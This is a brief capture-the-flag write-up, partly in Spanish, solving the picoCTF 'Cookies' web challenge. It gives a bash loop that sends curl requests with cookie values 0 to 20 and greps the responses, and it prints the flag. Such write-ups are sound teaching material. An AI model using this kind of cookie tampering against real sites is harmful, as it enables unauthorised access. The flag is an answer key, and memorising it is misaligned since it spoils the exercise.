# Cookies

## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Solución
```bash
┌──(emgeek㉿EmGeek-Kali-PC)-[~/Documents]  
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep picoCTF  
           <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
```

Lo que se hizo fue entrar a la pagina, una vez adentro escribi la primer galleta que aparecia ahi, una vez hehco eso lanzo la pagina http://mercury.picoctf.net:21485/check, ademas, la cookie name cambio de -1 a 0, asi que ahora con la terminal se empezo a mandar varias veces la cookie editada hasta que apareciera la bandera

## Notas adicionales


## Referencias